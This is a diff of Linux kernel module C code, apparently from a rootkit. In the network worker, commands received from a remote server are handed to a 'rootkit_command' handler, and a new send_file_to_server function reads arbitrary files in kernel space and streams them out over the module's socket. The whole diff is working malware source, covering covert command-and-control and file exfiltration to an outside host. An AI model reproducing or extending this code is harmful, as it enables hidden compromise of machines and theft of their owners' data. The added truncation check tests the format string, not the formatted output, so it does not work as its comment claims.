@@ -46,43 +46,115 @@ int close_socket(void)
  *         their meanings should be documented in the implementation.
  */
 int send_to_server(char *message, ...) {
-    struct kvec vec = {0};
-    struct msghdr msg = {0};
-    int ret_code = 0;
-    va_list args;
-    char *formatted_message;
-    
-    formatted_message = kmalloc(1024, GFP_KERNEL);
-    if (!formatted_message) {
-        ERR_MSG("send_to_server: memory allocation failed\n");
-        return -ENOMEM;
-    }
+	struct kvec vec = {0};
+	struct msghdr msg = {0};
+	int ret_code = 0;
+	va_list args;
+	char *formatted_message;
+	bool truncated = false;
 
-    if (!sock) {
-        ERR_MSG("send_to_server: socket is NULL\n");
-        kfree(formatted_message);
-        return -FAILURE;
-    }
+	formatted_message = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+	if (!formatted_message) {
+		ERR_MSG("send_to_server: memory allocation failed\n");
+		return -ENOMEM;
+	}
 
-    // Format the message with additional arguments
-    va_start(args, message);
-    vsnprintf(formatted_message, 1024, message, args);
-    va_end(args);
+	if (!sock) {
+		ERR_MSG("send_to_server: socket is NULL\n");
+		kfree(formatted_message);
+		return -FAILURE;
+	}
 
-    vec.iov_base = formatted_message;
-    vec.iov_len = strlen(formatted_message);
+	// Format the message with additional arguments
+	va_start(args, message);
+	int written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
+	
+	if(written < 0) {
+		ERR_MSG("send_to_server: vsnprintf failed\n");
+		kfree(formatted_message);
+		va_end(args);
+		return -FAILURE;
+	}
 
-    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-    if (ret_code < 0) {
-        ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
-        kfree(formatted_message);
-        return -FAILURE;
-    }
+	va_end(args);
 
-    kfree(formatted_message);
+	// Check if the message was truncated
+	if (strlen(message) >= STD_BUFFER_SIZE) {
+		truncated = true;
+		strncat(formatted_message, " (truncated msg)", STD_BUFFER_SIZE - strlen(formatted_message) - 1);
+	}
 
-    return SUCCESS;
+	vec.iov_base = formatted_message;
+	vec.iov_len = strlen(formatted_message);
+
+	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+	if (ret_code < 0) {
+		ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
+		kfree(formatted_message);
+		return -FAILURE;
+	}
+
+	kfree(formatted_message);
+
+	return SUCCESS;
 }
+
+int send_file_to_server(char *filename) {
+	struct file *file = NULL;
+	char *buffer = NULL;
+	loff_t pos = 0;
+	ssize_t read_size;
+	int ret_code = 0;
+
+	// Allocation du buffer pour les chunks
+	buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+	if (!buffer) {
+		ERR_MSG("send_file_to_server: failed to allocate buffer\n");
+		return -ENOMEM;
+	}
+	memset(buffer, 0, STD_BUFFER_SIZE);
+
+	// Ouverture du fichier
+	file = filp_open(filename, O_RDONLY, 0);
+	if (IS_ERR(file)) {
+		ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
+		kfree(buffer);
+		return -ENOENT;
+	}
+
+	// Lecture et envoi du fichier chunk par chunk
+	while ((read_size = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
+		struct kvec vec = {
+			.iov_base = buffer,
+			.iov_len = read_size
+		};
+		struct msghdr msg = {0};
+
+		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+		if (ret_code < 0) {
+			ERR_MSG("send_file_to_server: failed to send chunk: %d\n", ret_code);
+			filp_close(file, NULL);
+			kfree(buffer);
+			return -FAILURE;
+		}
+		memset(buffer, 0, STD_BUFFER_SIZE);
+	}
+
+	if (read_size < 0) {
+		ERR_MSG("send_file_to_server: failed to read file \"%s\" during send\n", filename);
+		ret_code = -FAILURE;
+	} else {
+		DBG_MSG("send_file_to_server: file \"%s\" sent successfully\n", filename);
+		ret_code = SUCCESS;
+	}
+
+	// Nettoyage
+	filp_close(file, NULL);
+	kfree(buffer);
+
+	return ret_code;
+}
+
 
 /**
  * @brief Kernel thread function for managing network communication.
@@ -193,7 +265,8 @@ int network_worker(void *data)
 			empty_count = 0; // Reset the empty message count
 		}
 
-		rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
+		if(strcmp(recv_buffer, "\n") != 0)
+			rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
 
 		kfree(recv_buffer);
 		recv_buffer = NULL;
